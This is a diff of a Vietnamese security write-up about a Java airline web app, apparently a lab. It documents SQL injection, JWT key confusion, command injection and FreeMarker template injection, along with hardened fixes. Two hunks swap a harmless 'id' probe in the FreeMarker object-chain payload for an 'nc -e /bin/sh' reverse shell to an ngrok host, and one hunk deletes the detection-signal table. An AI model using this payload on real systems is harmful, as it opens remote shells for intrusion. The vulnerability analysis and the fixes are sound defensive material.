@@ -982,6 +982,7 @@ Dấu hiệu xác nhận:
 ### 6.1. Không dùng XMLDecoder cho untrusted input
 
 ```java
+// File: src/main/java/org/example/serviceImpl/PromotionServiceImpl.java
 /*
  * FIXED CODE:
  * Do not parse uploaded XML with java.beans.XMLDecoder. XMLDecoder is a Java
@@ -1004,6 +1005,7 @@ private void importPromotionXml(Path xmlFile) {
 ### 6.2. Nếu vẫn dùng XML parser, tắt external entity và map DTO thủ công
 
 ```java
+// File: src/main/java/org/example/serviceImpl/PromotionServiceImpl.java
 /*
  * FIXED CODE:
  * Example hardened parser setup for XML-to-DTO parsing. This does not make
@@ -1026,6 +1028,7 @@ PromotionImportDto dto = PromotionImportDto.from(document);
 ### 6.3. Fix queue path để không tạo thêm write primitive
 
 ```java
+// File: src/main/java/org/example/serviceImpl/PromotionServiceImpl.java
 /*
  * FIXED CODE:
  * Keep queued files inside promotionDir, generate server-side names, and do
@@ -1447,6 +1450,7 @@ python3 sqlmap.py -u "http://localhost:3000/api/v1/transaction/conditions?flight
 ### 6.1. Fix FlightSearchRepositoryImpl
 
 ```java
+// File: src/main/java/org/example/repository/FlightSearchRepositoryImpl.java
 /*
  * FIXED CODE:
  * Replace the concatenated keyword with a named parameter and bind it after
@@ -1467,6 +1471,7 @@ query.setParameter("keyword", keyword);
 ### 6.2. Fix TransactionSearchRepositoryImpl
 
 ```java
+// File: src/main/java/org/example/repository/TransactionSearchRepositoryImpl.java
 /*
  * FIXED CODE:
  * Replace the concatenated flightName with a named parameter and bind it after
@@ -1487,6 +1492,7 @@ query.setParameter("flightName", flightName);
 ### 6.3. Fix error message leak
 
 ```java
+// File: src/main/java/org/example/controller/FlightController.java
 /*
  * FIXED CODE:
  * Do not return e.getMessage() to clients. Keep detailed SQL/DB errors in logs
@@ -1966,6 +1972,7 @@ Implication:
 ### 5.1. Fix Algorithm Confusion
 
 ```java
+// File: src/main/java/org/example/security/JwtUtils.java
 /*
  * FIXED CODE:
  * This service issues RS256 tokens only. Do not let the attacker-controlled
@@ -1985,6 +1992,7 @@ return verificationKey;
 Nếu cần legacy HS256 trong migration, dùng secret riêng:
 
 ```java
+// File: src/main/java/org/example/security/JwtUtils.java
 /*
  * FIXED CODE:
  * Use a separate random server-side HMAC secret. Never derive an HMAC secret
@@ -1996,6 +2004,7 @@ this.legacyVerificationKey = Keys.hmacShaKeyFor(Decoders.BASE64.decode(jwtLegacy
 ### 5.2. Fix `jwk`/`jku`/`x5u` header injection
 
 ```java
+// File: src/main/java/org/example/security/JwtUtils.java
 /*
  * FIXED CODE:
  * Reject embedded or remote header-supplied verification keys. Use kid only as
@@ -2009,6 +2018,7 @@ if (header.containsKey("jwk") || header.containsKey("jku") || header.containsKey
 ### 5.3. Fix `kid` lookup
 
 ```java
+// File: src/main/java/org/example/security/JwtUtils.java
 /*
  * FIXED CODE:
  * Validate kid and resolve it from a server-controlled map. Unknown kid must
@@ -2029,6 +2039,7 @@ return verificationKey;
 Nếu key files thật sự cần thiết:
 
 ```java
+// File: src/main/java/org/example/security/JwtUtils.java
 /*
  * FIXED CODE:
  * Resolve files with Path under a fixed directory and read directly. No shell.
@@ -2912,6 +2923,7 @@ sequenceDiagram
 Không dùng `kid` để dựng shell command. `kid` chỉ được là selector vào key store do server kiểm soát:
 
 ```java
+// File: src/main/java/org/example/security/JwtUtils.java
 String kid = header.getKeyId();
 if (!StringUtils.hasText(kid) || !kid.matches("^[A-Za-z0-9._-]+$")) {
     throw new UnsupportedJwtException("Invalid JWT kid");
@@ -2927,6 +2939,7 @@ return verificationKey;
 Nếu bắt buộc đọc key file, dùng `Path` trong fixed directory và không gọi shell:
 
 ```java
+// File: src/main/java/org/example/security/JwtUtils.java
 Path keyDir = Paths.get("jwt-keys").toAbsolutePath().normalize();
 Path keyPath = keyDir.resolve(kid + ".pem").normalize();
 if (!keyPath.startsWith(keyDir)) {
@@ -2940,6 +2953,7 @@ return parsePublicKey(Files.readString(keyPath, StandardCharsets.US_ASCII));
 Không chạy `qrencode` qua `/bin/sh -c`; truyền argument tách rời:
 
 ```java
+// File: src/main/java/org/example/util/QRCodeHelper.java
 ProcessBuilder processBuilder = new ProcessBuilder(
         "qrencode",
         "-t", "SVG",
@@ -2952,6 +2966,7 @@ Process process = processBuilder.start();
 Thêm content policy và timeout fail-closed:
 
 ```java
+// File: src/main/java/org/example/util/QRCodeHelper.java
 if (resolvedContent.length() > 256) {
     throw new IllegalArgumentException("QR content is too long");
 }
@@ -3088,12 +3103,12 @@ private String renderTemplateSource(String templateSource, Map<String, Object> m
 
 Điểm nguy hiểm:
 
-| Dòng xử lý                             | Ý nghĩa bảo mật                                       |
-| -------------------------------------- | ----------------------------------------------------- |
-| `templateSource` là string đọc từ file | Nội dung ngoài source code có thể trở thành template  |
-| `new Template(...StringReader...)`     | Freemarker parse expression trong string              |
-| `template.process(model, writer)`      | Expression được process với model do backend cung cấp |
-| Response là `TEXT_HTML`                | Output được trả cho frontend và render bằng HTML      |
+| Dòng xử lý                             | Ý nghĩa bảo mật                                        |
+| -------------------------------------- | ------------------------------------------------------ |
+| `templateSource` là string đọc từ file | Nội dung ngoài source code có thể trở thành template   |
+| `new Template(...StringReader...)`     | Freemarker parse expression trong string               |
+| `template.process(model, writer)`      | Expression được thực thi với model do backend cung cấp |
+| Response là `TEXT_HTML`                | Output được trả cho frontend và render bằng HTML       |
 
 ### 3.3. Dev-supplied helper: `QRCodeHelper?new()`
 
@@ -3206,14 +3221,14 @@ ${profileTheme.templatePath}
 ${profileTheme.class.protectionDomain.classLoader}
 ```
 
-Object-chain payload shape cụ thể:
+Object-chain payload shape cụ thể dựa trên [CVE-2021-25770](https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack) có thể hoạt động trên phiên bản Freemarker < 2.3.30:
 
 ```ftl
 <#assign classLoader = profileTheme.class.protectionDomain.classLoader>
 <#assign objectWrapperClass = classLoader.loadClass("freemarker.template.ObjectWrapper")>
 <#assign defaultWrapper = objectWrapperClass.getField("DEFAULT_WRAPPER").get(null)>
 <#assign executeClass = classLoader.loadClass("freemarker.template.utility.Execute")>
-${defaultWrapper.newInstance(executeClass, null)("id")}
+${defaultWrapper.newInstance(executeClass, null)("nc -e /bin/sh 0.tcp.ap.ngrok.io <port>")}
 ```
 
 Luồng detect object-chain:
@@ -3240,7 +3255,7 @@ Kết luận riêng cho nhánh object-chain:
 | Model expose domain object                |             Có | `ProfileTheme`                   |
 | Wrapper cho phép bean-style object access |             Có | `DefaultObjectWrapper`           |
 | Version cố định phù hợp với object chain  |             Có | `freemarker.version = 2.3.29`    |
-| Template content được evaluate            |             Có | `new Template(...).process(...)` |
+| Template content được thực thi            |             Có | `new Template(...).process(...)` |
 
 ### 3.5. Truy ngược về source `profileTheme`
 
@@ -3327,13 +3342,12 @@ sequenceDiagram
 
 Security notes:
 
-| Step | Rủi ro | Ghi chú |
-|---|---|---|
-| `PUT /api/v1/user` | Có | Backend nhận nguyên `User` JSON, chỉ giữ lại existing theme khi field null |
-| `USER.PROFILE_THEME` | Có | Stored selector khiến chain persistent |
-| `resolveThemeName(user)` | Có | Không allowlist `light_mode.ftl`, `dark_mode.ftl` |
-| `customThemeRoot.resolve(themeName)` | Có | Không normalize + `startsWith(customThemeRoot)` |
-| `new Template(...templateSource...)` | Có | File content trở thành executable Freemarker template |
+| Step                                 | Rủi ro | Ghi chú                                                                    |
+| ------------------------------------ | ------ | -------------------------------------------------------------------------- |
+| `PUT /api/v1/user`                   | Có     | Backend nhận nguyên `User` JSON, chỉ giữ lại existing theme khi field null |
+| `USER.PROFILE_THEME`                 | Có     | Stored selector khiến chain persistent                                     |
+| `resolveThemeName(user)`             | Có     | Không allowlist `light_mode.ftl`, `dark_mode.ftl`                          |
+| `new Template(...templateSource...)` | Có     | File content trở thành executable Freemarker template                      |
 
 ### 4.2. Source template content -> dev-supplied helper sink
 
@@ -3377,7 +3391,7 @@ Với object-chain, payload không cần `QRCodeHelper`. Nó dùng object `profi
 <#assign owc = cl.loadClass("freemarker.template.ObjectWrapper")>
 <#assign dw = owc.getField("DEFAULT_WRAPPER").get(null)>
 <#assign ec = cl.loadClass("freemarker.template.utility.Execute")>
-${dw.newInstance(ec, null)("id")}
+${dw.newInstance(ec, null)("nc -e /bin/sh 0.tcp.ap.ngrok.io <port>")}
 ```
 
 Luồng từ source đến object-chain:
@@ -3402,14 +3416,6 @@ sequenceDiagram
     FTL->>Exec: newInstance(...)(command)
 ```
 
-Detect signal:
-
-| Probe | Ý nghĩa |
-|---|---|
-| `${profileTheme.name}` | Chứng minh object được expose vào template |
-| `${profileTheme.class}` | Chứng minh object wrapper cho class metadata |
-| `${profileTheme.class.protectionDomain.classLoader}` | Chứng minh object-chain anchor đến classloader |
-| `Execute("id")` hoặc `Execute("sleep 5")` | Chứng minh object-chain có thể tạo command side effect |
 
 ***
 
@@ -3417,9 +3423,10 @@ Detect signal:
 
 ### 5.1. Fix selector `profileTheme`
 
-Không persist arbitrary filename/path từ JSON. Chỉ nhận theme id trong allowlist:
+Không nghe theo arbitrary filename/path từ JSON. Chỉ nhận theme id trong allowlist:
 
 ```java
+// File: src/main/java/org/example/controller/UserController.java
 private static final Set<String> ALLOWED_PROFILE_THEMES =
         Set.of("light_mode.ftl", "dark_mode.ftl");
 
@@ -3436,6 +3443,7 @@ if (!StringUtils.hasText(requestedTheme)) {
 Không compile arbitrary filesystem content làm Freemarker template:
 
 ```java
+// File: src/main/java/org/example/util/CustomThemeLoader.java
 private static final Map<String, String> THEME_ALLOWLIST = Map.of(
         "light_mode.ftl", "themes/light_mode.ftl",
         "dark_mode.ftl", "themes/dark_mode.ftl");
@@ -3447,6 +3455,7 @@ Template template = configuration.getTemplate(templatePath);
 Nếu vẫn cần custom theme, phải normalize path và chặn thoát root:
 
 ```java
+// File: src/main/java/org/example/util/CustomThemeLoader.java
 Path root = customThemeRoot.toRealPath();
 Path candidate = root.resolve(themeName).normalize();
 if (!candidate.startsWith(root) || !candidate.getFileName().toString().endsWith(".ftl")) {
@@ -3459,6 +3468,7 @@ if (!candidate.startsWith(root) || !candidate.getFileName().toString().endsWith(
 Không cho template tự instantiate arbitrary class:
 
 ```java
+// File: src/main/java/org/example/config/FreeMarkerSandboxConfig.java
 configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
 configuration.setObjectWrapper(new SimpleObjectWrapper(Configuration.VERSION_2_3_29));
 ```
@@ -3466,6 +3476,7 @@ configuration.setObjectWrapper(new SimpleObjectWrapper(Configuration.VERSION_2_3
 Nếu cần helper, expose instance đã audit:
 
 ```java
+// File: src/main/java/org/example/config/FreeMarkerSandboxConfig.java
 configuration.setSharedVariable("qrHelper", new SafeQRCodeHelper());
 ```
 
@@ -3474,6 +3485,7 @@ configuration.setSharedVariable("qrHelper", new SafeQRCodeHelper());
 Không expose Java object vào model khi chỉ cần text:
 
 ```java
+// File: src/main/java/org/example/controller/ProfileViewController.java
 model.put("profileTheme", resolveThemeName(user));
 model.put("profileThemeName", new ProfileTheme(resolveThemeName(user)).getName());
 ```
@@ -3746,6 +3758,7 @@ Kết luận kết hợp:
 Normalize path và bắt buộc nằm trong custom theme root:
 
 ```java
+// File: src/main/java/org/example/util/CustomThemeLoader.java
 Path root = customThemeRoot.toRealPath();
 Path candidate = root.resolve(themeName).normalize();
 if (!candidate.startsWith(root) || !candidate.getFileName().toString().endsWith(".ftl")) {
@@ -3756,6 +3769,7 @@ if (!candidate.startsWith(root) || !candidate.getFileName().toString().endsWith(
 Không dùng regex tự chế để quyết định path an toàn. Nếu vẫn cần regex, chỉ dùng như lớp phụ:
 
 ```java
+// File: src/main/java/org/example/util/CustomThemeLoader.java
 private static final Pattern SAFE_THEME_NAME =
         Pattern.compile("^[A-Za-z0-9_-]+\\.ftl$");
 ```
@@ -3765,6 +3779,7 @@ private static final Pattern SAFE_THEME_NAME =
 Không để access log nằm trong vùng application có thể đọc qua theme loader:
 
 ```properties
+# File: src/main/resources/application.properties
 server.tomcat.accesslog.directory=/var/log/ktv-airline
 server.tomcat.accesslog.pattern=%h %l %u %t "%m %U %H" %s %b
 ```
@@ -3783,6 +3798,7 @@ Nguyên tắc:
 Ngay cả khi đọc nhầm file, không được compile nội dung file bất kỳ thành Freemarker:
 
 ```java
+// File: src/main/java/org/example/util/CustomThemeLoader.java
 String templateSource = Files.readString(resolvedThemePath, StandardCharsets.UTF_8);
 return "<pre>" + escapeHtml(templateSource) + "</pre>";
 ```
